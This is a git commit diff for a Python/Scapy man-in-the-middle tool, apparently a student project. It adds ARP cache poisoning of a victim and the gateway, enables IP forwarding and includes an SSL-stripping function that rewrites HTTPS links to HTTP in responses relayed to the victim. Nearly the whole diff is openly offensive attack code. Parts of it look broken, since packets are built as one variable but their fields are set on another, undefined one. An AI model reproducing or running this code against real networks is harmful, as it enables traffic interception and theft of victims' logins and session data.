bc1518fa09715f6b96ad55b16cc06d5fc1c2d295
Bart van Dooren <Balo@live.nl>
2019-04-04 10:55:48 +0200

    update

--- arpPoison.py
+++ arpPoison.py
@@ -4,27 +4,32 @@ file = open("vIP.txt")
 vIP = file.read()
 file.close()
 
+#KAN waarschijn weg
 def ip_to_mac(IP, retry= 2, timeout=2):
+       
+    #create inital ARP packet to send
     arp = ARP()
-
     arp.op = 1
-
     arp.hwdst = 'ff:ff:ff:ff:ff:ff'
     arp.pdst = IP
 
     response, unanswered = sr(arp, retry=retry, timeout=timeout)
 
     for s,r in response:
+    # If there is a repsonse return the mac address related to the given IP
         return r[ARP].underlayer.src
     
+    # If no reponse then return nothing
     return None
 
-vMac = ip_to_mac(vIP);
+#Get the mac address of the victim, mac of the attacker, 
+#vMac = ip_to_mac(vIP);
 macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
 vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
 gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)
 gatewayMac = subprocess.check_output("arp -n | awk '$1 == " + gatewayIP + "  {print $3}'", shell = True)
 
+#Create arp packet for victim
 arpVictim = Ether() / ARP()
 arp[Ether].src = macAttacker
 arp[ARP].hwsrc = macAttacker
@@ -32,6 +37,7 @@ arp[ARP].psrc = gatewayIP
 arp[ARP].hwdst = vMAC
 arp[ARP].pdst = vIP
 
+#Create arp packet for Gateway
 arpGateway = Ether() / ARP()
 arp[Ether].src = macAttacker
 arp[ARP].hwsrc = macAttacker
@@ -39,7 +45,7 @@ arp[ARP].psrc = vIP
 arp[ARP].hwdst = gatewayMac
 arp[ARP].pdst = gatewayIP
 
-  
+vIP = raw_input("Victim IP address?")
 def arpPoison():
     sendp(arpVictim, iface="enp0s3")
     sendp(arpGateway, iface="enp0s3")
--- main.py
+++ main.py
@@ -1,6 +1,19 @@
 import os
 from scapy.all import *
 import time
+import requests
+
+print "                                                               "
+print "              _           _        _             _             "
+print "      ___ ___| |      ___| |_ _ __(_)_ __  _ __ (_)_ __   __ _ "
+print "     / __/ __| |_____/ __| __| '__| | '_ \| '_ \| | '_ \ / _` |"
+print "     \__ \__ \ |_____\__ \ |_| |  | | |_) | |_) | | | | | (_| |"
+print "     |___/___/_|     |___/\__|_|  |_| .__/| .__/|_|_| |_|\__, |"
+print "                                    |_|   |_|            |___/ "
+print "                                                               "
+print "                              Including secure cookie stripping"
+print "                                                               "
+print "                                                               "
 
 print "Enabling IP forwarding"
 file = open("/proc/sys/net/ipv4/ip_forward", "w")
@@ -18,4 +31,36 @@ file.write(vIP)
 file.close
 
 os.system("gnome-terminal -e 'python arpPoison.py' & disown")
+
+#Starting the stripping process
+
+def StrippingHTTPS(url, requestA):
+
+    # Response message for the victim
+    responseVictim = requests.models.Response()
+
+    # reponse message url is equal to provided url
+    responseVictim.url = url
+
+    # Set HTTPstatuscode to 200 OK
+    responseVictim.status_code = 200
+
+
+    # Replace HTTPS with HTTPS 
+    newURL = str(requestA.text).replace("HTTPS", "HTTP")
+    newURL = str(newURL).replace("https", "http")
+
+    responseVictim._content = newURL.encode('utf-8')
+
+    responseVictim.headers = requestA.headers
+    responseVictim.history = requestA.history
+    responseVictim.encoding = requestA.encoding
+    responseVictim.reason = requestA.reason
+    responseVictim.elapsed = requestA.elapsed
+    responseVictim.request = requestA.request
+
+    print "HTTPS was stripped"
+
+    return responseVictim
+
 
